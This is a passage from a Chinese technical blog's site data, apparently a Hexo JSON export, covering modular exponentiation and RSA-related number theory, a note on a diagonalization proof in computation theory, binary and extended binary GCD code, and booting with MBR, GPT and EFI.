id=\"n-为质数时\"><a href=\"#n-为质数时\" class=\"headerlink\" title=\"$n$为质数时\"></a>$n$为质数时</h4><ul>\n<li>根据费尔马小定理有$x^{n-1}=1(mod\\ n)$</li>\n<li>求解a在模$n-1$下的乘法逆元$b$，$x^{ab}=x^{1+k(n-1)}=x(mod\\ n)$</li>\n</ul>\n<h4 id=\"n-为合数时\"><a href=\"#n-为合数时\" class=\"headerlink\" title=\"$n$为合数时\"></a>$n$为合数时</h4><ul>\n<li>目前是没有<strong>通用</strong>的高效解的——不仅仅在$n=pq$（p、q为质数）时没有，而是$n$为任意合数时都没有</li>\n<li>可以构造如下规约，使得如果$n$为多个（大于2个）质数的积时有高效解，那么RSA就被攻破。假设$y^e=c(mod\\ pq)$，即$y^e+kpq=c$，然后假设有一个算法，对于$n=rst$（r、s、t为任意质数）时有高效算法$T$，那么，我们两边乘以$t^e$得到 $y^e\\times t^e +kpqt^e=(yt)^e+kpqt^e=ct^e$，模上$pqt$，得到$(yt)^e=ct^e(mod\\ pqt)$，让算法$T$求解出$yt$，从而，我们得到了$y=yt\\times t^{-1}(mod\\ pqt)$</li>\n</ul>\n<h2 id=\"a-b-x-mod-n\"><a href=\"#a-b-x-mod-n\" class=\"headerlink\" title=\"$a^b=x(mod\\ n)$\"></a>$a^b=x(mod\\ n)$</h2><ul>\n<li><p>快速模幂，算法如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fastModulePow</span><span class=\"params\">(x, y, n)</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">    :return: x**y mod n</span></span><br><span class=\"line\"><span class=\"string\">    \"\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> y == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span> % n</span><br><span class=\"line\">    ans, x = <span class=\"number\">1</span> % n, x % n</span><br><span class=\"line\">    <span class=\"keyword\">while</span> y != <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (y &amp; <span class=\"number\">1</span>) == <span class=\"number\">1</span>:</span><br><span class=\"line\">            ans = x * ans % n</span><br><span class=\"line\">        x, y = x * x % n, y // <span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> ans</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n","slug":"y-z-mod-n-的所有相关问题的解法","categories":[{"name":"数学","slug":"数学","permalink":"https://h-zex.github.io/categories/数学/"},{"name":"密码学","slug":"数学/密码学","permalink":"https://h-zex.github.io/categories/数学/密码学/"}],"tags":[{"name":"离散对数","slug":"离散对数","permalink":"https://h-zex.github.io/tags/离散对数/"},{"name":"快速幂","slug":"快速幂","permalink":"https://h-zex.github.io/tags/快速幂/"},{"name":"RSA","slug":"RSA","permalink":"https://h-zex.github.io/tags/RSA/"}]},{"title":"对Introduction to the Theory of Computation 3rd Theorem 9.20 的一些理解","date":"2018-09-29T06:45:15.000Z","path":"2018/09/29/对ITOC-3rd-Theorem-9-20-的一些理解/","text":"证明中，通过枚举所有的P时间内运行的图灵机，然后利用对角化方法，来构造集合$A$，使得对于某一个$M_i$和某一个选定的$n$，要么$M_i$识别$1^n$，但是$A$不包含长度为n的字符串，要么$M_i$不识别$1^n$，但是$A$包含某一个长度为n的字符串。并且，为了使得$M_i$与$n$可以一一对应，要求所选取的$n$单调增长 按照文中描述的方法，构造似乎可以成立。但是，有一个重要的地方作者没有提及——无论集合$A$是否构造好，我们都应该可以运行任意一台$M_i$，$M_i$行为要保持一致 在我们运行$M_i$来构造集合$A$ 的过程中，每次$M_i$查询orcale，orcale都会因为长度为$n$ 的字符串尚未被决定是否加进去集合$A$而回答NO，不过，如果我们决定长度为$n$的字符串是否加进去集合$A$中后，orcale会如实回答。那么，在长度为n的字符串被决定是否加进去集合$A$之前和之后，orcale对某些字符串的回答不一致是否会导致$M_i$ 的行为改变，从而本来$M_i$不识别$1^n$，现在却识别了$1^n$，或者相反 可以证明，无论$A$是否构造好，$M_i$的行为还是会保持一致 一开始，长度为$n$的字符串还没有加进去时，orcale都是回答NO，所以： 如果$M_i$不识别$1^n$，我们就给$A$加进去一个$M_i$没有询问到长度为n的字符串，从而，虽然集合$A$现在有了长度为$n$的字符串，但是，对于输入$1^n$，$M_i$对orcale的询问的答案依然全部是NO——因为输入确定，$M_i$确定，所以$M_i$究竟会询问orcale哪些字符串也是确定的——只要我们保证对询问的回答是一致的 如果$M_i$识别$1^n$，那么我们根本就不会给集合$A$加进去长度为$n$的字符串，那么，对于输入$1^n$，orcale对$M_i$的询问的结果依然全部是NO 这个证明要成立还有一个很重要的地方，图灵机是可数个的，因为对于每一台$M_i$，我们都使用独特的$n$，那么，如果图灵机有不可数个，这个一一对应关系就无法建立。","raw":"---\ntitle: 对Introduction to the Theory of Computation 3rd Theorem 9.20 的一些理解\ndate: 2018-09-29 14:45:15\ntags:\n- 图灵机\n- P与NP\n- 对角化\ncategories:\n- 计算理论\n---\n\n- {% asset_img 1.png %}\n- 证明中，通过枚举所有的P时间内运行的图灵机，然后利用对角化方法，来构造集合$A$，使得对于某一个$M_i$和某一个选定的$n$，要么$M_i$识别$1^n$，但是$A$不包含长度为n的字符串，要么$M_i$不识别$1^n$，但是$A$包含某一个长度为n的字符串。并且，为了使得$M_i$与$n$可以一一对应，要求所选取的$n$单调增长\n- 按照文中描述的方法，构造似乎可以成立。但是，有一个重要的地方作者没有提及——**无论集合$A$是否构造好，**我们都应该可以运行任意一台$M_i$，$M_i$行为要保持一致\n- 在我们运行$M_i$来构造集合$A$ 的过程中，每次$M_i$查询orcale，orcale都会因为长度为$n$ 的字符串尚未被决定是否加进去集合$A$而回答NO，不过，如果我们决定长度为$n$的字符串是否加进去集合$A$中后，orcale会如实回答。那么，在长度为n的字符串被决定是否加进去集合$A$之前和之后，orcale对某些字符串的回答不一致是否会导致$M_i$ 的行为改变，从而本来$M_i$不识别$1^n$，现在却识别了$1^n$，或者相反\n- 可以证明，无论$A$是否构造好，$M_i$的行为还是会保持一致\n- 一开始，长度为$n$的字符串还没有加进去时，orcale都是回答NO，所以：\n  - 如果$M_i$不识别$1^n$，我们就给$A$加进去一个$M_i$没有询问到长度为n的字符串，从而，虽然集合$A$现在有了长度为$n$的字符串，但是，对于输入$1^n$，$M_i$对orcale的询问的答案依然全部是NO——因为输入确定，$M_i$确定，所以$M_i$究竟会询问orcale哪些字符串也是确定的——只要我们保证对询问的回答是一致的\n  - 如果$M_i$识别$1^n$，那么我们根本就不会给集合$A$加进去长度为$n$的字符串，那么，对于输入$1^n$，orcale对$M_i$的询问的结果依然全部是NO\n- 这个证明要成立还有一个很重要的地方，图灵机是可数个的，因为对于每一台$M_i$，我们都使用独特的$n$，那么，如果图灵机有不可数个，这个一一对应关系就无法建立。\n","content":"<ul>\n<li><img src=\"/2018/09/29/对ITOC-3rd-Theorem-9-20-的一些理解/1.png\"></li>\n<li>证明中，通过枚举所有的P时间内运行的图灵机，然后利用对角化方法，来构造集合$A$，使得对于某一个$M_i$和某一个选定的$n$，要么$M_i$识别$1^n$，但是$A$不包含长度为n的字符串，要么$M_i$不识别$1^n$，但是$A$包含某一个长度为n的字符串。并且，为了使得$M_i$与$n$可以一一对应，要求所选取的$n$单调增长</li>\n<li>按照文中描述的方法，构造似乎可以成立。但是，有一个重要的地方作者没有提及——<strong>无论集合$A$是否构造好，</strong>我们都应该可以运行任意一台$M_i$，$M_i$行为要保持一致</li>\n<li>在我们运行$M_i$来构造集合$A$ 的过程中，每次$M_i$查询orcale，orcale都会因为长度为$n$ 的字符串尚未被决定是否加进去集合$A$而回答NO，不过，如果我们决定长度为$n$的字符串是否加进去集合$A$中后，orcale会如实回答。那么，在长度为n的字符串被决定是否加进去集合$A$之前和之后，orcale对某些字符串的回答不一致是否会导致$M_i$ 的行为改变，从而本来$M_i$不识别$1^n$，现在却识别了$1^n$，或者相反</li>\n<li>可以证明，无论$A$是否构造好，$M_i$的行为还是会保持一致</li>\n<li>一开始，长度为$n$的字符串还没有加进去时，orcale都是回答NO，所以：<ul>\n<li>如果$M_i$不识别$1^n$，我们就给$A$加进去一个$M_i$没有询问到长度为n的字符串，从而，虽然集合$A$现在有了长度为$n$的字符串，但是，对于输入$1^n$，$M_i$对orcale的询问的答案依然全部是NO——因为输入确定，$M_i$确定，所以$M_i$究竟会询问orcale哪些字符串也是确定的——只要我们保证对询问的回答是一致的</li>\n<li>如果$M_i$识别$1^n$，那么我们根本就不会给集合$A$加进去长度为$n$的字符串，那么，对于输入$1^n$，orcale对$M_i$的询问的结果依然全部是NO</li>\n</ul>\n</li>\n<li>这个证明要成立还有一个很重要的地方，图灵机是可数个的，因为对于每一台$M_i$，我们都使用独特的$n$，那么，如果图灵机有不可数个，这个一一对应关系就无法建立。</li>\n</ul>\n","slug":"对ITOC-3rd-Theorem-9-20-的一些理解","categories":[{"name":"计算理论","slug":"计算理论","permalink":"https://h-zex.github.io/categories/计算理论/"}],"tags":[{"name":"图灵机","slug":"图灵机","permalink":"https://h-zex.github.io/tags/图灵机/"},{"name":"P与NP","slug":"P与NP","permalink":"https://h-zex.github.io/tags/P与NP/"},{"name":"对角化","slug":"对角化","permalink":"https://h-zex.github.io/tags/对角化/"}]},{"title":"Binary GCD And Extend Binary GCD","date":"2018-09-17T13:58:41.000Z","path":"2018/09/17/Binary-GCD-And-Extend-Binary-GCD/","text":"Binary GCD 代码 1234567891011121314151617181920212223def binaryGCD(x, y): x, y = abs(x), abs(y) if x == 0 or y == 0: return x + y if x == y: return x cnt = 0 # this cycle is O(N^2)(assume that N = max(lgx, lgy)) while ((x &amp; 1) | (y &amp; 1)) == 0: cnt += 1 x = x &gt;&gt; 1 y = y &gt;&gt; 1 # the y below is surely odd # when x-y, x and y are odd, so x will become even # so the x&gt;&gt;1 will be run every cycles # so this cycle is O(N^2) while x != 0: while (x &amp; 1) == 0: x = x &gt;&gt; 1 if y &gt; x: x, y = y, x x, y = x - y, y return y * (1 &lt;&lt; cnt) 复杂度分析：设$n=max(bitlen(x), bitlen(y))$。17行开始的循环中，因为y必然为奇数，所以x-y为偶数，所以第18行的循环在每次外层循环运行一次时都至少运行一次，所以有$O(n)$次循环，每次循环需要$O(n)$的均摊复杂度——因为第18行的每次都是$O(n)$的复杂度，然后整个算法中这种移位最多有$O(n)$次，所以，整个算法复杂度为$O(n^2)$ trivial 版本的GCD如下 1234def GCD(x, y): while y != 0: x, y = y, x % y return x 需要$O(n^3)$的复杂度 Extend Binary GCD 代码，引用自 1234567891011121314151617181920212223242526272829303132333435363738394041424344def extendBinaryGCD(a, b): \"\"\"Extended binary GCD. Given input a, b the function returns s, t, d such that gcd(a,b) = d = as + bt.\"\"\" if a == 0: return 0, 1, b if b == 0: return 1, 0, a if a == b: return 1, 0, a u, v, s, t, r = 1, 0, 0, 1, 0 while (a % 2 == 0) and (b % 2 == 0): a, b, r = a // 2, b // 2, r + 1 alpha, beta = a, b # # from here on we maintain a = u * alpha + v * beta # and b = s * alpha + t * beta # while a % 2 == 0: # v is always even a = a // 2 if (u % 2 == 0) and (v % 2 == 0): u, v = u // 2, v // 2 else: u, v = (u + beta) // 2, (v - alpha) // 2 while a != b: if b % 2 == 0: b = b // 2 # # Commentary: note that here, since b is even, # (i) if s, t are both odd then so are alpha, beta # (ii) if s is odd and t even then alpha must be even, so beta is odd # (iii) if t is odd and s even then beta must be even, so alpha is odd # so for each of (i), (ii) and (iii) s + beta and t - alpha are even # if (s % 2 == 0) and (t % 2 == 0): s, t = s // 2, t // 2 else: s, t = (s + beta) // 2, (t - alpha) // 2 elif b &lt; a: a, b, u, v, s, t = b, a, s, t, u, v else: b, s, t = b - a, s - u, t - v return s, t, (2 ** r) * a 思路：从19行开始，维护式子b=s*alpha+t*beta 的成立——可以验证，每次s、t更改后，式子还是成立","raw":"---\ntitle: Binary GCD And Extend Binary GCD\ndate: 2018-09-17 21:58:41\ntags:\n- 欧几里得算法\n- 扩展欧几里得\n- 二进制欧几里得算法\ncategories:\n- 数学\n- 密码学\n---\n\n## Binary GCD\n\n- 代码\n\n  ```python\n  def binaryGCD(x, y):\n      x, y = abs(x), abs(y)\n      if x == 0 or y == 0:\n          return x + y\n      if x == y:\n          return x\n      cnt = 0\n      # this cycle is O(N^2)(assume that N = max(lgx, lgy))\n      while ((x & 1) | (y & 1)) == 0:\n          cnt += 1\n          x = x >> 1\n          y = y >> 1\n      # the y below is surely odd\n      # when x-y, x and y are odd, so x will become even\n      # so the x>>1 will be run every cycles\n      # so this cycle is O(N^2)\n      while x != 0:\n          while (x & 1) == 0:\n              x = x >> 1\n          if y > x:\n              x, y = y, x\n          x, y = x - y, y\n      return y * (1 << cnt)\n  ```\n\n- 复杂度分析：设$n=max(bitlen(x), bitlen(y))$。17行开始的循环中，因为`y`必然为奇数，所以`x-y`为偶数，所以第18行的循环在每次外层循环运行一次时都至少运行一次，所以有$O(n)$次循环，每次循环需要$O(n)$的均摊复杂度——因为第18行的每次都是$O(n)$的复杂度，然后整个算法中这种移位最多有$O(n)$次，所以，整个算法复杂度为$O(n^2)$\n\n- trivial 版本的GCD如下\n\n  ```python\n  def GCD(x, y):\n      while y != 0:\n          x, y = y, x % y\n      return x\n  ```\n\n  需要$O(n^3)$的复杂度\n\n## Extend Binary GCD\n\n- 代码，[引用自](http://www.ucl.ac.uk/~ucahcjm/combopt/ext_gcd_python_programs.pdf)\n\n  ```python\n  def extendBinaryGCD(a, b):\n      \"\"\"Extended binary GCD.\n      Given input a, b the function returns s, t, d\n      such that gcd(a,b) = d = as + bt.\"\"\"\n      if a == 0:\n          return 0, 1, b\n      if b == 0:\n          return 1, 0, a\n      if a == b:\n          return 1, 0, a\n      u, v, s, t, r = 1, 0, 0, 1, 0\n      while (a % 2 == 0) and (b % 2 == 0):\n          a, b, r = a // 2, b // 2, r + 1\n      alpha, beta = a, b\n      #\n      # from here on we maintain a = u * alpha + v * beta\n      # and b = s * alpha + t * beta\n      #\n      while a % 2 == 0:\n          # v is always even\n          a = a // 2\n          if (u % 2 == 0) and (v % 2 == 0):\n              u, v = u // 2, v // 2\n          else:\n              u, v = (u + beta) // 2, (v - alpha) // 2\n      while a != b:\n          if b % 2 == 0:\n              b = b // 2\n              #\n              # Commentary: note that here, since b is even,\n              # (i) if s, t are both odd then so are alpha, beta\n              # (ii) if s is odd and t even then alpha must be even, so beta is odd\n              # (iii) if t is odd and s even then beta must be even, so alpha is odd\n              # so for each of (i), (ii) and (iii) s + beta and t - alpha are even\n              #\n              if (s % 2 == 0) and (t % 2 == 0):\n                  s, t = s // 2, t // 2\n              else:\n                  s, t = (s + beta) // 2, (t - alpha) // 2\n          elif b < a:\n              a, b, u, v, s, t = b, a, s, t, u, v\n          else:\n              b, s, t = b - a, s - u, t - v\n      return s, t, (2 ** r) * a\n  ```\n\n- 思路：从19行开始，维护式子b=s\\*alpha+t\\*beta 的成立——可以验证，每次s、t更改后，式子还是成立\n\n","content":"<h2 id=\"Binary-GCD\"><a href=\"#Binary-GCD\" class=\"headerlink\" title=\"Binary GCD\"></a>Binary GCD</h2><ul>\n<li><p>代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binaryGCD</span><span class=\"params\">(x, y)</span>:</span></span><br><span class=\"line\">    x, y = abs(x), abs(y)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> x == <span class=\"number\">0</span> <span class=\"keyword\">or</span> y == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> x + y</span><br><span class=\"line\">    <span class=\"keyword\">if</span> x == y:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> x</span><br><span class=\"line\">    cnt = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"comment\"># this cycle is O(N^2)(assume that N = max(lgx, lgy))</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> ((x &amp; <span class=\"number\">1</span>) | (y &amp; <span class=\"number\">1</span>)) == <span class=\"number\">0</span>:</span><br><span class=\"line\">        cnt += <span class=\"number\">1</span></span><br><span class=\"line\">        x = x &gt;&gt; <span class=\"number\">1</span></span><br><span class=\"line\">        y = y &gt;&gt; <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"comment\"># the y below is surely odd</span></span><br><span class=\"line\">    <span class=\"comment\"># when x-y, x and y are odd, so x will become even</span></span><br><span class=\"line\">    <span class=\"comment\"># so the x&gt;&gt;1 will be run every cycles</span></span><br><span class=\"line\">    <span class=\"comment\"># so this cycle is O(N^2)</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> x != <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (x &amp; <span class=\"number\">1</span>) == <span class=\"number\">0</span>:</span><br><span class=\"line\">            x = x &gt;&gt; <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> y &gt; x:</span><br><span class=\"line\">            x, y = y, x</span><br><span class=\"line\">        x, y = x - y, y</span><br><span class=\"line\">    <span class=\"keyword\">return</span> y * (<span class=\"number\">1</span> &lt;&lt; cnt)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>复杂度分析：设$n=max(bitlen(x), bitlen(y))$。17行开始的循环中，因为<code>y</code>必然为奇数，所以<code>x-y</code>为偶数，所以第18行的循环在每次外层循环运行一次时都至少运行一次，所以有$O(n)$次循环，每次循环需要$O(n)$的均摊复杂度——因为第18行的每次都是$O(n)$的复杂度，然后整个算法中这种移位最多有$O(n)$次，所以，整个算法复杂度为$O(n^2)$</p>\n</li>\n<li><p>trivial 版本的GCD如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">GCD</span><span class=\"params\">(x, y)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> y != <span class=\"number\">0</span>:</span><br><span class=\"line\">        x, y = y, x % y</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x</span><br></pre></td></tr></table></figure>\n<p>需要$O(n^3)$的复杂度</p>\n</li>\n</ul>\n<h2 id=\"Extend-Binary-GCD\"><a href=\"#Extend-Binary-GCD\" class=\"headerlink\" title=\"Extend Binary GCD\"></a>Extend Binary GCD</h2><ul>\n<li><p>代码，<a href=\"http://www.ucl.ac.uk/~ucahcjm/combopt/ext_gcd_python_programs.pdf\" target=\"_blank\" rel=\"noopener\">引用自</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">extendBinaryGCD</span><span class=\"params\">(a, b)</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\"Extended binary GCD.</span></span><br><span class=\"line\"><span class=\"string\">    Given input a, b the function returns s, t, d</span></span><br><span class=\"line\"><span class=\"string\">    such that gcd(a,b) = d = as + bt.\"\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> a == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>, <span class=\"number\">1</span>, b</span><br><span class=\"line\">    <span class=\"keyword\">if</span> b == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>, <span class=\"number\">0</span>, a</span><br><span class=\"line\">    <span class=\"keyword\">if</span> a == b:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>, <span class=\"number\">0</span>, a</span><br><span class=\"line\">    u, v, s, t, r = <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (a % <span class=\"number\">2</span> == <span class=\"number\">0</span>) <span class=\"keyword\">and</span> (b % <span class=\"number\">2</span> == <span class=\"number\">0</span>):</span><br><span class=\"line\">        a, b, r = a // <span class=\"number\">2</span>, b // <span class=\"number\">2</span>, r + <span class=\"number\">1</span></span><br><span class=\"line\">    alpha, beta = a, b</span><br><span class=\"line\">    <span class=\"comment\">#</span></span><br><span class=\"line\">    <span class=\"comment\"># from here on we maintain a = u * alpha + v * beta</span></span><br><span class=\"line\">    <span class=\"comment\"># and b = s * alpha + t * beta</span></span><br><span class=\"line\">    <span class=\"comment\">#</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> a % <span class=\"number\">2</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"comment\"># v is always even</span></span><br><span class=\"line\">        a = a // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (u % <span class=\"number\">2</span> == <span class=\"number\">0</span>) <span class=\"keyword\">and</span> (v % <span class=\"number\">2</span> == <span class=\"number\">0</span>):</span><br><span class=\"line\">            u, v = u // <span class=\"number\">2</span>, v // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            u, v = (u + beta) // <span class=\"number\">2</span>, (v - alpha) // <span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> a != b:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> b % <span class=\"number\">2</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            b = b // <span class=\"number\">2</span></span><br><span class=\"line\">            <span class=\"comment\">#</span></span><br><span class=\"line\">            <span class=\"comment\"># Commentary: note that here, since b is even,</span></span><br><span class=\"line\">            <span class=\"comment\"># (i) if s, t are both odd then so are alpha, beta</span></span><br><span class=\"line\">            <span class=\"comment\"># (ii) if s is odd and t even then alpha must be even, so beta is odd</span></span><br><span class=\"line\">            <span class=\"comment\"># (iii) if t is odd and s even then beta must be even, so alpha is odd</span></span><br><span class=\"line\">            <span class=\"comment\"># so for each of (i), (ii) and (iii) s + beta and t - alpha are even</span></span><br><span class=\"line\">            <span class=\"comment\">#</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (s % <span class=\"number\">2</span> == <span class=\"number\">0</span>) <span class=\"keyword\">and</span> (t % <span class=\"number\">2</span> == <span class=\"number\">0</span>):</span><br><span class=\"line\">                s, t = s // <span class=\"number\">2</span>, t // <span class=\"number\">2</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                s, t = (s + beta) // <span class=\"number\">2</span>, (t - alpha) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> b &lt; a:</span><br><span class=\"line\">            a, b, u, v, s, t = b, a, s, t, u, v</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            b, s, t = b - a, s - u, t - v</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s, t, (<span class=\"number\">2</span> ** r) * a</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>思路：从19行开始，维护式子b=s*alpha+t*beta 的成立——可以验证，每次s、t更改后，式子还是成立</p>\n</li>\n</ul>\n","slug":"Binary-GCD-And-Extend-Binary-GCD","categories":[{"name":"数学","slug":"数学","permalink":"https://h-zex.github.io/categories/数学/"},{"name":"密码学","slug":"数学/密码学","permalink":"https://h-zex.github.io/categories/数学/密码学/"}],"tags":[{"name":"欧几里得算法","slug":"欧几里得算法","permalink":"https://h-zex.github.io/tags/欧几里得算法/"},{"name":"扩展欧几里得","slug":"扩展欧几里得","permalink":"https://h-zex.github.io/tags/扩展欧几里得/"},{"name":"二进制欧几里得算法","slug":"二进制欧几里得算法","permalink":"https://h-zex.github.io/tags/二进制欧几里得算法/"}]},{"title":"Booting a System","date":"2018-09-17T01:22:08.000Z","path":"2018/09/17/Booting-a-System/","text":"Legacy BIOS 传统的bios假设boot device start with a record called MBR，MBR512个字节，包含first-stage boot loader（也叫boot block）和一个分区表 无论是BIOS还是第一阶段的boot loader都没有足够的能力去读取标准的文件系统，所以第二阶段的boot loader的位置必须足够容易获取。在大多数场景下，boot block从MBR读取分区表，识别出那些marked as “active”的硬盘分区，然后其从这些分区的开头读取并运行第二阶段boot loader，这个方案被叫做”volume boot record” 第二阶段的boot loader还可以处于MBR和第一个磁盘分区之间的”dead zone”。由于历史原因，第一个磁盘分区从第64个disk block开始（MBR所在的那个是第0个block），所以这个区域包含有32KB的空间，这个空间足够包含一个文件系统驱动。这个方案通常被GRUB使用 MBR boot block是OS-agnostic的，但是因为第二阶段的boot loader有多个版本可以安装，所以第二阶段的boot loader通常是了解操作系统和文件系统的，并且是可配置的 MBR MBR disks support only four partition table entries. For more than four partitions, a secondary structure known as an extended partition is necessary. Extended partitions can then be subdivided into one or more logical disks. EFI Intel’s extensible firmware interface (EFI) EFI演变成UEFI（unified EFI），被多家制造商支持，不过EFI仍然是更常使用的术语。EFI和UEFI基本上可以互换使用 GPT The EFI partitioning scheme, known as a “GUID partition table” or GPT A partition is a contiguous space of storage on a physical or logical disk that functions as if it were a physically separate disk. Partitions are visible to the system firmware and the installed operating systems. Access to a partition is controlled by the system firmware before the system boots the operating system, and then by the operating system after it is started. 只有一种分区类型（没有诸如逻辑分区），可以任意多的分区数目，有16-byte的GUID The specification allows an almost unlimited number of partitions. However, the Windows implementation restricts this to 128 partitions. The number of partitions is limited by the amount of space reserved for partition entries in the GPT. The 16-byte partition type GUID, which is similar to a System ID in the partition table of an MBR disk, identifies the type of data that the partition contains and identifies how the partition is used, for example, whether it is a basic disk or a dynamic disk. Note that each GUID partition entry has a backup copy. Windows and GPT FAQ Can a disk be both GPT and MBR?No. However, all GPT disks contain a Protective MBR. What is a Protective MBR?The Protective MBR, beginning in sector 0, precedes the GPT partition table on the disk. The MBR contains one type 0xEE partition that spans the disk. Why does the GPT have a Protective MBR?The Protective MBR protects GPT disks from previously released MBR disk tools such as Microsoft MS-DOS FDISK or Microsoft Windows NT Disk Administrator. These tools are not aware of GPT and don’t know how to properly access a GPT disk. Legacy software that does not know about GPT interprets only the Protected MBR when it accesses a GPT disk. These tools will view a GPT disk as having a single encompassing (possibly unrecognized) partition by interpreting the Protected MBR, rather than mistaking the disk for one that is unpartitioned. Why would a GPT-partitioned disk appear to have an MBR on it?This occurrs when you use an MBR-only-aware disk tool to access the GPT disk. 如果没有保护性的MBR，一些MBR-only的工具可能会认为该磁盘没有格式化所以去格式化该磁盘 不要使用不支持GPT的分区工具，这些工具会认为自己理解了磁盘布局，其实并没有。这是很危险的。 ESP The EFI system partition (also called ESP or EFISYS) is an OS independent partition that acts as the storage place for the EFI bootloaders, applications and drivers to be launched by the UEFI firmware. It is mandatory for UEFI boot. The UEFI specification mandates support for the FAT12, FAT16, and FAT32 filesystems (see UEFI specification version 2.7, section 13.3.1.1), but any conformant vendor can optionally add support for additional filesystems; for example, Apple Macs support (and by default use) their own HFS+ filesystem drivers. 因为这只是一个普通的FAT分区，所以可以被操作系统挂载、读写。 At boot time, the firmware consults the GPT partition table to identify the ESP. It then reads the configured target application directly from a file in the ESP and executes it. BOOT 没有boot block（除了Protective MBR） 在UEFI 系统，并不需要boot loader，UEFI boot target 可以是UNIX/Linux kernel，这些kernel可以被配置为direct UEFI 